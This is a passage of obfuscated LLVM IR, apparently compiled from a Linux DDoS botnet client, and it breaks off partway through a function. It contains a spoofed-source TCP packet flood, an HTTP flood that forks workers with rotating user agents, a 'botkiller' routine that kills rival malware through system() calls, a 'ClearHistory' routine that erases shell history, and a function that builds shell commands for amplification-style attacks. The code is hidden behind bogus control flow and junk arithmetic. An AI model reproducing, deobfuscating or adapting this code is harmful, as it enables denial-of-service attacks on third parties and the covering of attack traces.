  %_19 = sub i32 0, 1
  %gen20 = add i32 %_19, %621
  %_21 = sub i32 0, 1
  %gen22 = add i32 %_21, %621
  %_23 = sub i32 0, 1
  %gen24 = add i32 %_23, %621
  %622 = shl i32 1, %621
  %_25 = sub i32 0, %622
  %gen26 = add i32 %_25, 1
  %_27 = sub i32 %622, 1
  %gen28 = mul i32 %_27, 1
  %_29 = sub i32 %622, 1
  %gen30 = mul i32 %_29, 1
  %_31 = shl i32 %622, 1
  %_32 = shl i32 %622, 1
  %_33 = shl i32 %622, 1
  %623 = sub nsw i32 %622, 1
  %_34 = shl i32 %623, -1
  %_35 = sub i32 %623, -1
  %gen36 = mul i32 %_35, -1
  %_37 = sub i32 %623, -1
  %gen38 = mul i32 %_37, -1
  %_39 = sub i32 %623, -1
  %gen40 = mul i32 %_39, -1
  %_41 = sub i32 0, %623
  %gen42 = add i32 %_41, -1
  %_43 = sub i32 %623, -1
  %gen44 = mul i32 %_43, -1
  %_45 = shl i32 %623, -1
  %_46 = shl i32 %623, -1
  %624 = xor i32 %623, -1
  store i32 %624, i32* %27, align 4
  br label %originalBB14

originalBB50alteredBB:                            ; preds = %originalBB50, %199
  %625 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %626 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %625, i32 0, i32 0
  %627 = bitcast %union.anon.0* %626 to %struct.anon.1*
  %628 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %627, i32 0, i32 4
  %629 = load i16, i16* %628, align 4
  %_51 = sub i16 %629, -513
  %gen52 = mul i16 %_51, -513
  %_53 = sub i16 %629, -513
  %gen54 = mul i16 %_53, -513
  %_55 = shl i16 %629, -513
  %_56 = shl i16 %629, -513
  %_57 = shl i16 %629, -513
  %_58 = sub i16 0, %629
  %gen59 = add i16 %_58, -513
  %630 = and i16 %629, -513
  %_60 = sub i16 0, %630
  %gen61 = add i16 %_60, 512
  %631 = or i16 %630, 512
  store i16 %631, i16* %628, align 4
  %632 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %633 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %632, i32 0, i32 0
  %634 = bitcast %union.anon.0* %633 to %struct.anon.1*
  %635 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %634, i32 0, i32 4
  %636 = load i16, i16* %635, align 4
  %_62 = sub i16 0, %636
  %gen63 = add i16 %_62, -1025
  %_64 = shl i16 %636, -1025
  %637 = and i16 %636, -1025
  %_65 = sub i16 %637, 1024
  %gen66 = mul i16 %_65, 1024
  %_67 = sub i16 %637, 1024
  %gen68 = mul i16 %_67, 1024
  %_69 = sub i16 %637, 1024
  %gen70 = mul i16 %_69, 1024
  %_71 = shl i16 %637, 1024
  %_72 = sub i16 0, %637
  %gen73 = add i16 %_72, 1024
  %638 = or i16 %637, 1024
  store i16 %638, i16* %635, align 4
  %639 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %640 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %639, i32 0, i32 0
  %641 = bitcast %union.anon.0* %640 to %struct.anon.1*
  %642 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %641, i32 0, i32 4
  %643 = load i16, i16* %642, align 4
  %_74 = sub i16 0, %643
  %gen75 = add i16 %_74, -257
  %644 = and i16 %643, -257
  %_76 = sub i16 %644, 256
  %gen77 = mul i16 %_76, 256
  %_78 = shl i16 %644, 256
  %_79 = sub i16 %644, 256
  %gen80 = mul i16 %_79, 256
  %_81 = sub i16 0, %644
  %gen82 = add i16 %_81, 256
  %_83 = shl i16 %644, 256
  %_84 = sub i16 %644, 256
  %gen85 = mul i16 %_84, 256
  %_86 = sub i16 %644, 256
  %gen87 = mul i16 %_86, 256
  %645 = or i16 %644, 256
  store i16 %645, i16* %642, align 4
  %646 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %647 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %646, i32 0, i32 0
  %648 = bitcast %union.anon.0* %647 to %struct.anon.1*
  %649 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %648, i32 0, i32 4
  %650 = load i16, i16* %649, align 4
  %_88 = shl i16 %650, -4097
  %_89 = shl i16 %650, -4097
  %_90 = sub i16 %650, -4097
  %gen91 = mul i16 %_90, -4097
  %_92 = sub i16 %650, -4097
  %gen93 = mul i16 %_92, -4097
  %_94 = sub i16 0, %650
  %gen95 = add i16 %_94, -4097
  %_96 = sub i16 %650, -4097
  %gen97 = mul i16 %_96, -4097
  %_98 = sub i16 %650, -4097
  %gen99 = mul i16 %_98, -4097
  %651 = and i16 %650, -4097
  %_100 = sub i16 %651, 4096
  %gen101 = mul i16 %_100, 4096
  %_102 = sub i16 %651, 4096
  %gen103 = mul i16 %_102, 4096
  %_104 = shl i16 %651, 4096
  %_105 = sub i16 0, %651
  %gen106 = add i16 %_105, 4096
  %_107 = shl i16 %651, 4096
  %_108 = shl i16 %651, 4096
  %_109 = shl i16 %651, 4096
  %_110 = sub i16 %651, 4096
  %gen111 = mul i16 %_110, 4096
  %652 = or i16 %651, 4096
  store i16 %652, i16* %649, align 4
  %653 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %654 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %653, i32 0, i32 0
  %655 = bitcast %union.anon.0* %654 to %struct.anon.1*
  %656 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %655, i32 0, i32 4
  %657 = load i16, i16* %656, align 4
  %_112 = sub i16 0, %657
  %gen113 = add i16 %_112, -2049
  %_114 = sub i16 %657, -2049
  %gen115 = mul i16 %_114, -2049
  %_116 = sub i16 0, %657
  %gen117 = add i16 %_116, -2049
  %_118 = sub i16 0, %657
  %gen119 = add i16 %_118, -2049
  %_120 = sub i16 0, %657
  %gen121 = add i16 %_120, -2049
  %_122 = sub i16 0, %657
  %gen123 = add i16 %_122, -2049
  %_124 = sub i16 0, %657
  %gen125 = add i16 %_124, -2049
  %658 = and i16 %657, -2049
  %_126 = sub i16 %658, 2048
  %gen127 = mul i16 %_126, 2048
  %_128 = sub i16 0, %658
  %gen129 = add i16 %_128, 2048
  %_130 = sub i16 %658, 2048
  %gen131 = mul i16 %_130, 2048
  %_132 = shl i16 %658, 2048
  %_133 = shl i16 %658, 2048
  %_134 = shl i16 %658, 2048
  %659 = or i16 %658, 2048
  store i16 %659, i16* %656, align 4
  br label %originalBB50

originalBB138alteredBB:                           ; preds = %originalBB138, %273
  %660 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %661 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %660, i32 0, i32 0
  %662 = bitcast %union.anon.0* %661 to %struct.anon.1*
  %663 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %662, i32 0, i32 4
  %664 = load i16, i16* %663, align 4
  %_139 = shl i16 %664, -1025
  %_140 = sub i16 0, %664
  %gen141 = add i16 %_140, -1025
  %_142 = sub i16 0, %664
  %gen143 = add i16 %_142, -1025
  %_144 = sub i16 %664, -1025
  %gen145 = mul i16 %_144, -1025
  %665 = and i16 %664, -1025
  %_146 = shl i16 %665, 1024
  %_147 = sub i16 0, %665
  %gen148 = add i16 %_147, 1024
  %_149 = sub i16 0, %665
  %gen150 = add i16 %_149, 1024
  %_151 = sub i16 0, %665
  %gen152 = add i16 %_151, 1024
  %666 = or i16 %665, 1024
  store i16 %666, i16* %663, align 4
  br label %originalBB138

originalBB156alteredBB:                           ; preds = %originalBB156, %321
  %667 = load i8*, i8** %31, align 8
  %668 = call i32 @strcmp(i8* %667, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.188, i32 0, i32 0)) #10
  %669 = icmp ne i32 %668, 0
  br label %originalBB156

originalBB160alteredBB:                           ; preds = %originalBB160, %354
  br label %originalBB160

originalBB164alteredBB:                           ; preds = %originalBB164, %371
  br label %originalBB164

originalBB168alteredBB:                           ; preds = %originalBB168, %389
  %670 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %670, i8** %31, align 8
  br label %originalBB168

originalBB172alteredBB:                           ; preds = %originalBB172, %457
  br label %originalBB172

originalBB176alteredBB:                           ; preds = %originalBB176, %474
  %671 = load i32, i32* %25, align 4
  %672 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %673 = call i64 @sendto(i32 %671, i8* %157, i64 %155, i32 0, %struct.sockaddr* %672, i32 16)
  %674 = load i32, i32* %27, align 4
  %675 = call i32 @GetRandomIP(i32 %674)
  %676 = call i32 @htonl(i32 %675) #13
  %677 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %678 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %677, i32 0, i32 8
  store i32 %676, i32* %678, align 4
  %679 = call i32 @rand_cmwc()
  %680 = trunc i32 %679 to i16
  %681 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %682 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %681, i32 0, i32 3
  store i16 %680, i16* %682, align 4
  %683 = call i32 @rand_cmwc()
  %684 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %685 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %684, i32 0, i32 0
  %686 = bitcast %union.anon.0* %685 to %struct.anon.1*
  %687 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %686, i32 0, i32 2
  store i32 %683, i32* %687, align 4
  %688 = call i32 @rand_cmwc()
  %689 = trunc i32 %688 to i16
  %690 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %691 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %690, i32 0, i32 0
  %692 = bitcast %union.anon.0* %691 to %struct.anon.1*
  %693 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %692, i32 0, i32 0
  store i16 %689, i16* %693, align 4
  %694 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %695 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %694, i32 0, i32 0
  %696 = bitcast %union.anon.0* %695 to %struct.anon.1*
  %697 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %696, i32 0, i32 6
  store i16 0, i16* %697, align 4
  %698 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %699 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %700 = call zeroext i16 @tcpcsum(%struct.iphdr* %698, %struct.tcphdr* %699)
  %701 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %702 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %701, i32 0, i32 0
  %703 = bitcast %union.anon.0* %702 to %struct.anon.1*
  %704 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %703, i32 0, i32 6
  store i16 %700, i16* %704, align 4
  %705 = bitcast i8* %157 to i16*
  %706 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %707 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %706, i32 0, i32 2
  %708 = load i16, i16* %707, align 2
  %709 = zext i16 %708 to i32
  %710 = call zeroext i16 @csum(i16* %705, i32 %709)
  %711 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %712 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %711, i32 0, i32 7
  store i16 %710, i16* %712, align 2
  %713 = load i32, i32* %33, align 4
  %714 = load i32, i32* %23, align 4
  %715 = icmp eq i32 %713, %714
  br label %originalBB176

originalBB180alteredBB:                           ; preds = %originalBB180, %536
  %716 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %717 = load i32, i32* %32, align 4
  %718 = icmp sgt i32 %716, %717
  br label %originalBB180

originalBB184alteredBB:                           ; preds = %originalBB184, %556
  br label %originalBB184

originalBB188alteredBB:                           ; preds = %originalBB188, %577
  %719 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %719)
  br label %originalBB188
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @botkiller() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [80 x i8], align 16
  br label %3

; <label>:3:                                      ; preds = %originalBBpart24, %0
  store i32 0, i32* %1, align 4
  br label %4

; <label>:4:                                      ; preds = %46, %3
  %5 = load i32, i32* @x.91
  %6 = load i32, i32* @y.92
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = load i32, i32* %1, align 4
  %14 = icmp slt i32 %13, 9
  %15 = load i32, i32* @x.91
  %16 = load i32, i32* @y.92
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %49

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %25 = call i32 (i8*, i8*, ...) @sprintf(i8* %24, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.190, i32 0, i32 0)) #2
  %26 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %27 = load i32, i32* %1, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [86 x i8*], [86 x i8*]* @knownBots, i64 0, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i8* @strcat(i8* %26, i8* %30) #2
  %32 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %33 = call i32 @system(i8* %32)
  %34 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %35 = call i32 (i8*, i8*, ...) @sprintf(i8* %34, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.191, i32 0, i32 0)) #2
  %36 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %37 = load i32, i32* %1, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [86 x i8*], [86 x i8*]* @knownBots, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @strcat(i8* %36, i8* %40) #2
  %42 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %43 = call i8* @strcat(i8* %42, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0)) #2
  %44 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %45 = call i32 @system(i8* %44)
  br label %46

; <label>:46:                                     ; preds = %23
  %47 = load i32, i32* %1, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %1, align 4
  br label %4

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* @x.91
  %51 = load i32, i32* @y.92
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = call i32 @sleep(i32 5)
  %59 = load i32, i32* @x.91
  %60 = load i32, i32* @y.92
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %3
                                                  ; No predecessors!
  %68 = load i32, i32* @x.91
  %69 = load i32, i32* @y.92
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %67
  %76 = load i32, i32* @x.91
  %77 = load i32, i32* @y.92
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %84 = load i32, i32* %1, align 4
  %85 = icmp slt i32 %84, 9
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %86 = call i32 @sleep(i32 5)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %67
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

declare i32 @system(i8*) #3

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = load i32, i32* @x.93
  %2 = load i32, i32* @y.94
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.193, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.194, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.195, i32 0, i32 0))
  %12 = load i32, i32* @x.93
  %13 = load i32, i32* @y.94
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %20 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.193, i32 0, i32 0))
  %21 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.194, i32 0, i32 0))
  %22 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.195, i32 0, i32 0))
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [649 x i8*], align 16
  %14 = alloca [3 x i8*], align 16
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = bitcast [649 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %19, i8* bitcast ([649 x i8*]* @sendHTTP.useragents to i8*), i64 5192, i32 16, i1 false)
  %20 = bitcast [3 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %20, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %21, %22
  store i32 %23, i32* %16, align 4
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %25 = load i8*, i8** %8, align 8
  %26 = load i8*, i8** %10, align 8
  %27 = call i32 @rand() #2
  %28 = srem i32 %27, 30
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* %14, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @rand() #2
  %33 = srem i32 %32, 674
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [649 x i8*], [649 x i8*]* %13, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %24, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.501, i32 0, i32 0), i8* %25, i8* %26, i8* %31, i8* %36) #2
  store i32 0, i32* %15, align 4
  br label %38

; <label>:38:                                     ; preds = %originalBBpart223, %6
  %39 = load i32, i32* %15, align 4
  %40 = load i32, i32* %12, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %134

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* @x.95
  %44 = load i32, i32* @y.96
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  %51 = call i32 @fork() #2
  %52 = icmp ne i32 %51, 0
  %53 = load i32, i32* @x.95
  %54 = load i32, i32* @y.96
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %52, label %61, label %98

; <label>:61:                                     ; preds = %originalBBpart2
  br label %62

; <label>:62:                                     ; preds = %96, %61
  %63 = load i32, i32* @x.95
  %64 = load i32, i32* @y.96
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %62
  %71 = load i32, i32* %16, align 4
  %72 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %73 = icmp sgt i32 %71, %72
  %74 = load i32, i32* @x.95
  %75 = load i32, i32* @y.96
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %73, label %82, label %97

; <label>:82:                                     ; preds = %originalBBpart24
  %83 = load i8*, i8** %7, align 8
  %84 = load i16, i16* %9, align 2
  %85 = call i32 @socket_connect(i8* %83, i16 zeroext %84)
  store i32 %85, i32* %18, align 4
  %86 = load i32, i32* %18, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %96

; <label>:88:                                     ; preds = %82
  %89 = load i32, i32* %18, align 4
  %90 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %91 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %92 = call i64 @strlen(i8* %91) #10
  %93 = call i64 @write(i32 %89, i8* %90, i64 %92)
  %94 = load i32, i32* %18, align 4
  %95 = call i32 @close(i32 %94)
  br label %96

; <label>:96:                                     ; preds = %88, %82
  br label %62

; <label>:97:                                     ; preds = %originalBBpart24
  call void @_exit(i32 1) #12
  unreachable

; <label>:98:                                     ; preds = %originalBBpart2
  %99 = load i32, i32* @x.95
  %100 = load i32, i32* @y.96
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %98
  %107 = load i32, i32* @x.95
  %108 = load i32, i32* @y.96
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %115

; <label>:115:                                    ; preds = %originalBBpart28
  %116 = load i32, i32* @x.95
  %117 = load i32, i32* @y.96
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %115
  %124 = load i32, i32* %15, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %15, align 4
  %126 = load i32, i32* @x.95
  %127 = load i32, i32* @y.96
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart223, label %originalBB10alteredBB

originalBBpart223:                                ; preds = %originalBB10
  br label %38

; <label>:134:                                    ; preds = %38
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %42
  %135 = call i32 @fork() #2
  %136 = icmp ne i32 %135, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %62
  %137 = load i32, i32* %16, align 4
  %138 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %139 = icmp sgt i32 %137, %138
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %98
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %115
  %140 = load i32, i32* %15, align 4
  %_ = sub i32 0, %140
  %gen = add i32 %_, 1
  %_11 = shl i32 %140, 1
  %_12 = sub i32 %140, 1
  %gen13 = mul i32 %_12, 1
  %_14 = shl i32 %140, 1
  %_15 = sub i32 %140, 1
  %gen16 = mul i32 %_15, 1
  %_17 = shl i32 %140, 1
  %_18 = sub i32 0, %140
  %gen19 = add i32 %_18, 1
  %_20 = sub i32 0, %140
  %gen21 = add i32 %_20, 1
  %141 = add nsw i32 %140, 1
  store i32 %141, i32* %15, align 4
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define void @senditbudAMP(i8*, i8*, i8*, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [128 x i8], align 16
  %10 = alloca [128 x i8], align 16
  %11 = alloca [128 x i8], align 16
  %12 = alloca [128 x i8], align 16
  %13 = alloca [128 x i8], align 16
  %14 = alloca [128 x i8], align 16
  %15 = alloca [128 x i8], align 16
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i8* %2, i8** %7, align 8
  store i8* %3, i8** %8, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @strcmp(i8* %16, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i32 0, i32 0)) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %27, label %19

; <label>:19:                                     ; preds = %4
  %20 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i32 0, i32 0
  %21 = load i8*, i8** %6, align 8
  %22 = load i8*, i8** %7, align 8
  %23 = load i8*, i8** %8, align 8
  %24 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %20, i64 128, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.503, i32 0, i32 0), i8* %21, i8* %22, i8* %23) #2
  %25 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i32 0, i32 0
  %26 = call i32 @system(i8* %25)
  br label %27

; <label>:27:                                     ; preds = %19, %4
  %28 = load i32, i32* @x.97
  %29 = load i32, i32* @y.98
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i8*, i8** %5, align 8
  %37 = call i32 @strcmp(i8* %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i32 0, i32 0)) #10
  %38 = icmp ne i32 %37, 0
  %39 = load i32, i32* @x.97
  %40 = load i32, i32* @y.98
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %55, label %47

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %49 = load i8*, i8** %6, align 8
  %50 = load i8*, i8** %7, align 8
